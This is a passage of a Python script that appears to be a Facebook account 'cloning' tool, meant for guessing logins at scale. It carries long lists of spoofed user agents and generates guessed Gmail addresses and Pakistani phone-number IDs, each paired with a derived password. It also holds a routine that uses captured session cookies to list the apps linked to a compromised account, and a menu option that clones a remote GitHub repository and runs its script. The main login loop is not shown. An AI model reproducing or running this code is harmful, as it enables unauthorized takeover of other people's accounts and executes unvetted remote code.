Mozilla/5.0 (Linux; Android 13; SM-A325M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; LM-K200 Build/QKQ1.200311.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; NTN-LX1 Build/HONORNTN-L21CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A125M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2007J3SY Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; 2201117TY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; 2201116PG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A135M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; moto g(6) plus Build/PPW29.116-16-29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]
Mozilla/5.0 (Linux; Android 10; moto g(7) play Build/QPYS30.52-22-14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; CPH1907 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A207M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; CPH2271 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 10; EML-L09 Build/HUAWEIEML-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; 2201117PG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; 2107113SG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]
Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A536E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
"""

ua=[]

##Logo##
P = '\x1b[1;92m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo= f'''
'\x1b[1;92m'$$$$$$$$\ $$$$$$\ $$$$$$$\  $$$$$$\ 
'\x1b[1;92m'\____$$  |\_$$  _|$$  __$$\ \_$$  _|
    '\x1b[1;92m'$$  /   $$ |  $$ |  $$ |  $$ |  
   '\x1b[1;92m'$$  /    $$ |  $$ |  $$ |  $$ |  
  '\x1b[1;92m'$$  /     $$ |  $$ |  $$ |  $$ |  
 '\x1b[1;92m'$$  /      $$ |  $$ |  $$ |  $$ |  
'\x1b[1;92m'$$$$$$$$\ $$$$$$\ $$$$$$$  |$$$$$$\ 
'\x1b[1;92m'\________|\______|\_______/ \______|
                                    
\033[1;93m=================================
\033[1;92m Owner  : PATHAN :/
\033[1;92m GitHub : PATHAN :/
\033[1;92m Version:\033[1;92m 2.0 \033[1;92m:/
\033[1;92m Status : Free :/
\033[1;92m Note : Use 100090/100089 For More OK Ids :/
\033[1;95m=================================
'''

####@-----Menu-----@####
def PATHAN_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    print(f"{oo(2)}Pak Random Cloning")
    print(f"{oo(3)}Gmail Cloning")  
    print(f"{oo(4)}Create File")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/PATHAN-2.0/FILE')
     os.system('cd && cd PATHAN ;python PATHAN.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.PATHAN'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        PATHAN_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;92m---\033[1;96m"+gm.replace('huwtn',' PATHAN-code=PATHAN-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;92m---\033[1;93m"+gm.replace('riJan','PATHAN-182^)Code=PATHAN-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .PATHAN')
        first = input(f'{oo("?")}Put First Name: ')
        last = input(f'{oo("?")}Put Last Name: ')
        domain = input(f'{oo("?")}Put Domain: ')
        try:
            limit = input(f'{oo("?")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.PATHAN','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.PATHAN','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.PATHAN', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}Put Code : ')
	try:
		limit = int(input(f'{oo("?")}Put Limit :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
"'[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'"
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:53.0) Gecko/20100101 Firefox/53.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.2; RadioClicker LITE; RadioClicker http://radioclicker.com; .NET CLR 2.0.50727)
Mozilla/5.0 (Linux; U; Android 1.5; ru-ru; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1
Opera/9.80 (Windows NT 6.1; U; Edition Yx; ru) Presto/2.10.229 Version/11.61
Opera/9.80 (Windows NT 5.1; U; MRA 5.7 (build 03790); ru) Presto/2.10.229 Version/11.61
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; CMDTDF; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1772.0 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/58.0.3029.83 Mobile/14E304 Safari/602.1
Mozilla/5.0 (Linux; Android 4.1.2; GT-N5110 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-G530AZ Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-G920A Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; LGMS330 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-T560NU Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Safari/537.36
Mozilla/5.0 (X11; CrOS armv7l 9000.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_2_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/58.0.3029.113 Mobile/14D27 Safari/602.1
Mozilla/5.0 (Linux; Android 5.1.1; LGLS665 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.2.5 (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/27.0.155813979 Mobile/14E304 Safari/602.1
Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/58.0.3029.113 Mobile/14E304 Safari/602.1
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.1 (KHTML, like Gecko) Version/10.0 Mobile/14G5028a Safari/602.1
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MDDRJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920A Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/27.0.155813979 Mobile/14A456 Safari/602.1
Mozilla/5.0 (Linux; Android 7.0; Moto G (4) Build/NPJS25.93-14-4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.21 (KHTML, like Gecko) Version/10.0 Mobile/15A5278f Safari/602.1
Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/27.0.155813979 Mobile/14F89 Safari/602.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8
Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A806 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 9460.60.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/29.0.159059490 Mobile/14F89 Safari/602.1
com.google.GoogleMobile/29.0.0 iPhone/10.3.2 hw/iPhone7_2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.38 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) GSA/29.0.159059490 Mobile/13G36 Safari/601.1
com.google.GoogleMobile/29.0.0 iPad/9.3.5 hw/iPad2_4
com.google.GoogleMobile/23.1.0 iPhone/8.1.1 hw/iPhone7_2
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/29.0.159059490 Mobile/14B100 Safari/602.1
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.4 (KHTML, like Gecko) Version/10.0 Mobile/14G5047a Safari/602.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700T1 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; .NET CLR 1.1.4322)
Dalvik/2.1.0 (Linux; U; Android 5.1; XT1096 Build/LPES23.32-25-5-5)
Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.11 Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (X11; CrOS i686 9202.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.146 Safari/537.36
Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5
Mozilla/5.0 (Linux; Android 6.0.1; SM-G900T Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ADMC; rv:11.0) like Gecko
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) GSA/31.0.161834491 Mobile/13G36 Safari/601.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/31.0.161834491 Mobile/14F89 Safari/602.1
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 AOL/9.8 AOLBuild/4346.2022.US Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/55.0.2883.79 Mobile/13F69 Safari/601.1.46
Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) GSA/31.0.161834491 Mobile/13F69 Safari/601.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8)
Apache-HttpClient/4.5.3-SNAPSHOT (Java/1.8.0_144)
Mozilla/5.0 (Linux; Android 6.0.1; SM-G550T1 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/26.0.154727556 Mobile/14F89 Safari/602.1
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 OPR/18.0.1284.68
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8
Mozilla/5.0 (Windows NT 6.3; rv:25.0) Gecko/20100101 Firefox/25.0
Mozilla/5.0 (Linux; Android 7.0; SM-T813 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36
Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T813 Build/NRD90M)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1; B3-A20 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.68 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; E6653 Build/32.4.A.0.160) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36
Java/1.8.0_141
Mozilla/5.0 (X11; CrOS armv7l 9592.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.80 Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; D5803 Build/23.5.A.1.291) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36
Opera/9.80 (Window NT 6.2; Win64; x64) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Android 7.0; Mobile; rv:55.0.2) Gecko/55.0.2 Firefox/55.0.2
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500FN Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2597.57
Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-P900 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/34.1.167176684 Mobile/14B100 Safari/602.1
Mozilla/5.0 (Linux; Android 6.0.1; D6633 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-J120A Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; P01MA Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/34.1.167176684 Mobile/14A456 Safari/602.1
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 AOL/9.8 AOLBuild/4346.2023.US Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-J727V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko)
Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)
Mozilla/5.0 (Linux; Android 7.0; SM-G930T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36
Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900V Build/MMB29M)
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]
Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]
Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/268.1.0.54.121;]
